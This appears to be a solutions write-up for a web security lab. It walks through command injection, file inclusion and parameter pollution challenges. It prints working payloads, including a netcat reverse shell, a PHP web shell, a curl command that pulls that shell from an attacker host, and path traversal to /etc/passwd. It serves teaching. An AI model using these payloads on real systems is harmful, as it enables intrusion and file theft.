Lab 6 Solutions
======


### Challenge 1
The ping utility can be manipulated to execute multiple commands by tacking on the AND operator (`&&`) after a valid IP address, followed by a second command.

To read the `flag.txt` file one directory back, we can submit a malicious input like `8.8.8.8 && cat ../flag.txt`.


### Challenge 2
Like challenge 1, the password reset utility can be manipulated to execute additional commands by tacking on the OR operator (`||`) after the email address, followed by a second command. 

Since this is a blind OCI vulnerability (i.e. we don't see any input), we should validate the vulnerability exists by submitting a malicious input that causes the webserver to respond with a measurable delay. This can be done using a command like `email@me.com || sleep 10`.

Next, we need to get a shell in order to explore the filesystem and view the `flag.txt` file in `/var/www/`. Unfortunately, it looks like the input form is removing specific characters from our request. For example, if we send a string like `email@me.com || &;'"()$/\-` we see that most non alpha numeric characters are removed, except for `/\-`.

Now, we must get a shell using a command that only includes these valid characters. This can be done by spawning a listener shell on your machine using `netcat -l -p 4444` and a shell on the vulnerable webserver by submitting the input `email@me.com || nc -e /bin/bash your_ip 4444`.


### Challenge 3
The quote of the day application takes user input via a GET parameter called `person` and loads a text file containing the quote of the day for that person. Since the quote is being loaded from the disk, it's possible that the `include()` function is using the `person` parameter directly without sanitization.

We can manipulate this application to read `/etc/passwd` by changing the `person` parameter to `../../../../../../../../../../etc/passwd`. Note that we may need to use many path traversal characters (`../`) to traverse far enough back into the root of the filesystem (i.e. `/`).


### Challenge 4
The second quote of the day application takes user input via a GET parameter called `person` and loads a text file containing the quote of the day for that person. Since the quote is being loaded from the disk, it's possible the `include()` function is using the `person` parameter directly without sanitization. 

Unlike Challenge 3, this application's `include()` function takes the `person` parameter as input without prepending a file path. This results in a remote file inclusion vulnerability if the requested file is a remote resource (e.g. `https://www.google.com`).

We can manipulate this application to execute a shell by changing the `person` parameter to load a remote PHP shell over HTTP or HTTPS. Note that the remote resource being requested must be a plain-text file containing PHP code, of which will be executed when the `include()` function runs. 

Lastly, if we change the `person` parameter to include a remote resource, it's important to ensure the resource is URL encoded!

An example malicious PHP shell might look like:
```php
<?php print_r(shell_exec($_GET['cmd'])); ?>
```

We can load this shell and execute commands by hosting it on a webserver (`http://attacker.com/shell.txt` in this example) and loading it using a request like:
```bash
curl http://container-ip:8084/?person=http%3A%2F%2Fattacker.com%2Fshell.txt&cmd=whoami
```


### Challenge 5
The Bitcoin Transfer System allows users to submit transfer requests to move Bitcoin between their wallets. Unfortunately, the users have been Goxxed and cannot seem to process withdraws for their BTC.

Based on the debug response from the system when transferring funds, we see that the parameters `From`, `To`, and `Amount` are being used to execute an `Action` (!) that's sent, presumably, to a backend server.

Since it looks like the request is being sent to a backend server, there's probably another variable that's being used to indicate the request is of type `transfer` (this can be deduced by examining the wording of the application). Likely, the full parameter being used in the code is `Action=transfer`.

To initiate a withdraw, we can use HTTP parameter pollution to overwrite the existing static `Action` parameter by issuing a request like:
```bash
curl http://container-ip:8085/?From=1KFHE7w8BhaENAswwryaoccDb6qcT6DbYY&To=3HqH1qGAqNWPpbrvyGjnRxNEjcUKD4e6ea&Amount=1&Action=withdraw
```

